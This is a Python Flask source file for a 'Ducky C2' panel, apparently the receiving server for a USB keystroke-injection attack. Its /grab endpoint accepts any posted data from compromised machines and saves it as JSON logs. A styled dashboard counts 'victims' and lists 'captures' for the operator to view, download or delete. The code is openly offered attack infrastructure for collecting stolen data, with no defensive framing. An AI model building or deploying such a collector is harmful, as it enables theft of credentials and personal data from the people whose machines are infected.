from flask import Flask, request, jsonify, render_template_string
import json
import os
import base64
from datetime import datetime
import re

app = Flask(__name__)

LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

# ============================================================
# HTML ШАБЛОН — КИБЕРПАНК СТИЛЬ
# ============================================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🪐 Ducky C2 Panel</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Orbitron', monospace;
            background: #0a0a0f;
            color: #00ff88;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            background-image:
                radial-gradient(ellipse at 20% 50%, rgba(0,255,136,0.03) 0%, transparent 70%),
                radial-gradient(ellipse at 80% 50%, rgba(0,255,136,0.03) 0%, transparent 70%);
        }
        .container {
            max-width: 900px;
            width: 100%;
            background: rgba(10,10,15,0.9);
            border: 1px solid rgba(0,255,136,0.1);
            border-radius: 24px;
            padding: 40px;
            box-shadow: 0 0 60px rgba(0,255,136,0.05), inset 0 0 60px rgba(0,255,136,0.02);
            backdrop-filter: blur(20px);
            position: relative;
            overflow: hidden;
        }
        .container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: conic-gradient(from 0deg, transparent, rgba(0,255,136,0.02), transparent, rgba(0,255,136,0.02), transparent);
            animation: rotate 20s linear infinite;
            pointer-events: none;
        }
        @keyframes rotate { 100% { transform: rotate(360deg); } }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            position: relative;
            z-index: 1;
        }
        h1 {
            font-size: 28px;
            font-weight: 900;
            background: linear-gradient(135deg, #00ff88, #00cc66);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: 2px;
        }
        .status-badge {
            font-size: 11px;
            padding: 6px 16px;
            border: 1px solid #00ff88;
            border-radius: 50px;
            color: #00ff88;
            animation: pulse-border 2s infinite;
        }
        @keyframes pulse-border {
            0%,100% { box-shadow: 0 0 10px rgba(0,255,136,0.1); }
            50% { box-shadow: 0 0 30px rgba(0,255,136,0.2); }
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 12px;
            margin-bottom: 30px;
            position: relative;
            z-index: 1;
        }
        .stat-card {
            background: rgba(0,255,136,0.03);
            border: 1px solid rgba(0,255,136,0.06);
            border-radius: 12px;
            padding: 16px;
            text-align: center;
            transition: all 0.3s ease;
        }
        .stat-card:hover {
            background: rgba(0,255,136,0.06);
            border-color: rgba(0,255,136,0.15);
            transform: translateY(-2px);
        }
        .stat-card .number {
            font-size: 24px;
            font-weight: 700;
            color: #00ff88;
            text-shadow: 0 0 20px rgba(0,255,136,0.2);
        }
        .stat-card .label {
            font-size: 9px;
            text-transform: uppercase;
            color: rgba(0,255,136,0.3);
            letter-spacing: 1px;
            margin-top: 4px;
        }
        .btn-row {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            position: relative;
            z-index: 1;
            margin-bottom: 30px;
        }
        .btn {
            flex: 1;
            min-width: 120px;
            padding: 12px 20px;
            border: none;
            border-radius: 10px;
            font-family: 'Orbitron', monospace;
            font-size: 11px;
            font-weight: 700;
            cursor: pointer;
            text-align: center;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: all 0.3s ease;
            letter-spacing: 0.5px;
            text-transform: uppercase;
        }
        .btn-primary {
            background: linear-gradient(135deg, #00ff88, #00cc66);
            color: #0a0a0f;
        }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(0,255,136,0.3); }
        .btn-secondary {
            background: rgba(0,255,136,0.05);
            border: 1px solid rgba(0,255,136,0.1);
            color: #00ff88;
        }
        .btn-secondary:hover { background: rgba(0,255,136,0.08); transform: translateY(-2px); }
        .btn-danger {
            background: rgba(255,50,50,0.1);
            border: 1px solid rgba(255,50,50,0.15);
            color: #ff4444;
        }
        .btn-danger:hover { background: rgba(255,50,50,0.2); transform: translateY(-2px); }
        .logs-section {
            border-top: 1px solid rgba(0,255,136,0.05);
            padding-top: 20px;
            position: relative;
            z-index: 1;
        }
        .logs-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }
        .logs-header h2 {
            font-size: 12px;
            font-weight: 700;
            color: rgba(0,255,136,0.5);
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .log-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 12px;
            background: rgba(0,255,136,0.02);
            border-radius: 6px;
            margin-bottom: 2px;
            border-left: 2px solid transparent;
            transition: all 0.3s ease;
        }
        .log-item:hover {
            background: rgba(0,255,136,0.04);
            border-left-color: #00ff88;
        }
        .log-item .name {
            font-size: 11px;
            color: rgba(0,255,136,0.7);
            font-family: 'Courier New', monospace;
        }
        .log-item .size { font-size: 10px; color: rgba(0,255,136,0.2); }
        .log-item .actions { display: flex; gap: 6px; }
        .log-item .actions a {
            color: rgba(0,255,136,0.2);
            text-decoration: none;
            font-size: 11px;
            padding: 2px 8px;
            border-radius: 4px;
            transition: all 0.2s;
        }
        .log-item .actions a:hover { color: #00ff88; background: rgba(0,255,136,0.05); }
        .empty {
            text-align: center;
            padding: 40px 0;
            color: rgba(0,255,136,0.1);
            font-size: 12px;
            letter-spacing: 1px;
        }
        .footer {
            margin-top: 30px;
            text-align: center;
            font-size: 9px;
            color: rgba(0,255,136,0.1);
            letter-spacing: 2px;
            text-transform: uppercase;
            position: relative;
            z-index: 1;
        }
        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0,255,136,0.1);
            border: 1px solid rgba(0,255,136,0.15);
            border-radius: 10px;
            padding: 12px 20px;
            color: #00ff88;
            font-size: 11px;
            display: none;
            backdrop-filter: blur(20px);
            font-family: 'Orbitron', monospace;
            animation: slideUp 0.3s ease;
        }
        @keyframes slideUp {
            0% { opacity: 0; transform: translateY(20px); }
            100% { opacity: 1; transform: translateY(0); }
        }
        @media (max-width: 700px) {
            .stats { grid-template-columns: repeat(2, 1fr); }
            .header { flex-direction: column; gap: 12px; align-items: flex-start; }
            .btn-row { flex-direction: column; }
            .container { padding: 20px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🪐 DUCKY C2</h1>
            <span class="status-badge">● ONLINE</span>
        </div>

        <div class="stats">
            <div class="stat-card">
                <div class="number">{{ files|length }}</div>
                <div class="label">Данных</div>
            </div>
            <div class="stat-card">
                <div class="number">{{ total_size }}</div>
                <div class="label">Всего</div>
            </div>
            <div class="stat-card">
                <div class="number">{{ last_file or '-' }}</div>
                <div class="label">Последний</div>
            </div>
            <div class="stat-card">
                <div class="number">{{ victims or 0 }}</div>
                <div class="label">Жертв</div>
            </div>
        </div>

        <div class="btn-row">
            <a href="/logs/" class="btn btn-primary">📂 Логи</a>
            <button onclick="window.location.reload()" class="btn btn-secondary">🔄 Обновить</button>
            <button onclick="clearAll()" class="btn btn-danger">🗑️ Очистить</button>
        </div>

        <div class="logs-section">
            <div class="logs-header">
                <h2>📄 Последние захваты</h2>
                <span class="count" style="font-size:10px;color:rgba(0,255,136,0.2);">{{ files|length }} файлов</span>
            </div>
            {% if files %}
                {% for file in files[:10] %}
                <div class="log-item">
                    <span class="name">{{ file.name }}</span>
                    <span class="size">{{ file.size }}</span>
                    <div class="actions">
                        <a href="/logs/{{ file.name }}">👁️</a>
                        <a href="/logs/{{ file.name }}" download>⬇️</a>
                        <a href="#" onclick="deleteFile('{{ file.name }}')" style="color:rgba(255,50,50,0.3);">✕</a>
                    </div>
                </div>
                {% endfor %}
            {% else %}
                <div class="empty">⏳ Ожидание подключения...</div>
            {% endif %}
        </div>
        <div class="footer">⚡ Render • AES-256 • Zero-Log</div>
    </div>

    <div id="toast" class="toast"></div>

    <script>
        function showToast(msg) {
            const t = document.getElementById('toast');
            t.textContent = msg;
            t.style.display = 'block';
            setTimeout(() => t.style.display = 'none', 3000);
        }
        function clearAll() {
            if (!confirm('Удалить все логи?')) return;
            fetch('/clear', { method: 'POST' }).then(() => { showToast('✅ Все логи удалены'); setTimeout(() => location.reload(), 500); });
        }
        function deleteFile(name) {
            if (!confirm('Удалить ' + name + '?')) return;
            fetch('/delete/' + name, { method: 'POST' }).then(() => { showToast('✅ ' + name + ' удалён'); setTimeout(() => location.reload(), 500); });
        }
        // Автообновление каждые 10 секунд
        setInterval(() => { fetch('/').then(() => {}).catch(() => {}); }, 10000);
    </script>
</body>
</html>
"""

# ============================================================
# МАРШРУТЫ — НЕ ПАДАЮТ
# ============================================================

@app.route('/')
def index():
    files = get_logs_info()
    total_size = format_size(sum(f['size_bytes'] for f in files))
    last_file = files[0]['name'] if files else None
    return render_template_string(HTML_TEMPLATE, files=files[:10], total_size=total_size, last_file=last_file, victims=len(files))

@app.route('/grab', methods=['POST', 'GET'])
def grab():
    try:
        if request.method == 'GET':
            return jsonify({"status": "OK", "message": "Send POST with data"}), 200

        data = request.get_json()
        if not data:
            data = request.form.to_dict()
            if not data:
                data = {"raw": request.get_data(as_text=True)}

        filename = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        filepath = os.path.join(LOG_DIR, filename)

        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)

        print(f"[+] Получены данные: {filename}")
        return jsonify({"status": "OK", "file": filename}), 200

    except Exception as e:
        print(f"[-] Ошибка: {e}")
        return jsonify({"error": str(e)}), 200  # Всегда возвращаем 200, чтобы не падать

@app.route('/logs/')
def list_logs():
    files = get_logs_info()
    html = "<h1>📁 Логи</h1><ul>"
    for f in files:
        html += f'<li><a href="/logs/{f["name"]}">{f["name"]}</a> ({f["size"]})</li>'
    html += "</ul>"
    return html

@app.route('/logs/<filename>')
def view_log(filename):
    filepath = os.path.join(LOG_DIR, filename)
    if not os.path.exists(filepath):
        return "File not found", 404
    with open(filepath, 'r', encoding='utf-8') as f:
        content = f.read()
    try:
        data = json.loads(content)
        formatted = json.dumps(data, indent=2, ensure_ascii=False)
    except:
        formatted = content
    return f"<pre style='font-family:monospace;padding:20px;background:#0a0a0f;color:#00ff88;min-height:100vh;'>{formatted}</pre>"

@app.route('/delete/<filename>', methods=['POST'])
def delete_log(filename):
    filepath = os.path.join(LOG_DIR, filename)
    if os.path.exists(filepath):
        os.remove(filepath)
    return jsonify({"status": "deleted"})

@app.route('/clear', methods=['POST'])
def clear_logs():
    for f in os.listdir(LOG_DIR):
        os.remove(os.path.join(LOG_DIR, f))
    return jsonify({"status": "cleared"})

# ============================================================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# ============================================================

def get_logs_info():
    files = []
    for f in os.listdir(LOG_DIR):
        if f.endswith('.json'):
            path = os.path.join(LOG_DIR, f)
            size = os.path.getsize(path)
            files.append({'name': f, 'size': format_size(size), 'size_bytes': size})
    files.sort(key=lambda x: x['size_bytes'], reverse=True)
    return files

def format_size(bytes):
    for unit in ['B', 'KB', 'MB', 'GB']:
        if bytes < 1024:
            return f"{bytes:.1f} {unit}"
        bytes /= 1024
    return f"{bytes:.1f} TB"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
